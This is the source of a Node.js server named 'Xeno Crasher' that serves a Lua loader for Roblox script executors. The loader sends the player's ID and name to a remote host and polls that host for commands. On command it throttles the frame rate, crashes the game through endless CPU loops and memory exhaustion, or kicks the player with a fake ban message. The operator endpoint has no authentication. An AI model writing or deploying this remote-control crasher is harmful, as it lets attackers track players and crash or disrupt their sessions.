const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

// ============================================
// ✅ CORS - ALLOWS ROBLOX TO CONNECT
// ============================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

// ============================================
// LOADER SCRIPT
// ============================================
app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher Client ]]--
local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

-- ============================================
-- SIMPLE HTTP - WORKS ON ALL EXECUTORS
-- ============================================
local function sendRequest(url, method, data)
    local HttpService = game:GetService("HttpService")
    HttpService.HttpEnabled = true
    
    -- Try different HTTP methods
    local functions = {
        function() return syn and syn.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return http and http.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return fluxus and fluxus.request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function() return http_request({ Url = url, Method = method, Headers = {["Content-Type"]="application/json",["X-Api-Key"]=KEY}, Body = data }) end,
        function()
            if method == "POST" then
                return HttpService:PostAsync(url, data or "", Enum.HttpContentType.ApplicationJson)
            else
                return HttpService:GetAsync(url)
            end
        end
    }
    
    for _, fn in ipairs(functions) do
        local success, result = pcall(fn)
        if success and result then
            return result
        end
    end
    
    return nil
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

-- ============================================
-- GUI
-- ============================================
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenoCrasherGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LP:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 50)
    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.4
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = "✅ Xeno Crasher Loaded"
    label.TextColor3 = Color3.fromRGB(100, 255, 100)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 14
    label.Parent = frame
    
    return screenGui
end

createGUI()

-- ============================================
-- HEARTBEAT
-- ============================================
local function heartbeat()
    safe(function()
        local data = HttpService:JSONEncode({
            user_id = LP.UserId,
            username = LP.Name,
            display_name = LP.DisplayName,
            executor = "XenoClient",
            online = true
        })
        
        local result = sendRequest(BASE .. "/api/public/heartbeat", "POST", data)
        
        if result then
            print("❤️ Heartbeat sent!")
        else
            print("⚠️ Heartbeat failed")
        end
    end)
end

-- ============================================
-- FPS LIMIT
-- ============================================
local fpsConnection = nil
local fpsActive = false

local function setFPSLimit(targetFPS)
    print("🎯 FPS: " .. tostring(targetFPS))
    
    if fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
        fpsActive = false
    end
    
    if not targetFPS or targetFPS <= 0 then
        return
    end
    
    fpsActive = true
    local frameTime = 1 / targetFPS
    
    fpsConnection = RunService.RenderStepped:Connect(function()
        local startTime = tick()
        while tick() - startTime < frameTime and fpsActive do end
    end)
end

-- ============================================
-- POLL
-- ============================================
local function poll()
    safe(function()
        local result = sendRequest(BASE .. "/api/public/command?user_id=" .. LP.UserId, "GET")
        
        if result and result ~= "" then
            local data = HttpService:JSONDecode(result)
            print("📥 Received: " .. HttpService:JSONEncode(data))
            
            if data.fps_limit then
                setFPSLimit(tonumber(data.fps_limit))
            else
                setFPSLimit(nil)
            end
            
            if data.crash == true then
                print("💥 CRASH!")
                task.spawn(function()
                    while true do
                        local x = 0
                        for i = 1, 1000000 do x = x + i end
                    end
                end)
                task.spawn(function()
                    local t = {}
                    while true do
                        for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
                        task.wait()
                    end
                end)
            end
            
            if data.kick == true then
                print("👢 KICK!")
                task.wait(0.5)
                LP:Kick("You have been banned.")
            end
        end
    end)
end

-- ============================================
-- START
-- ============================================
heartbeat()
poll()

task.spawn(function()
    while task.wait(5) do heartbeat() end
end)

task.spawn(function()
    while task.wait(1) do poll() end
end)

print("✅ Xeno Crasher loaded!")
print("👤 Player: " .. LP.Name)
`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// API ENDPOINTS
// ============================================

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now()
    });
    
    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    
    res.json({ players: list });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});
    
    const response = {};
    
    if (p.fps_limit) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    
    players.set(String(userId), p);
    res.json(response);
});

// ============================================
// SERVE FRONTEND
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
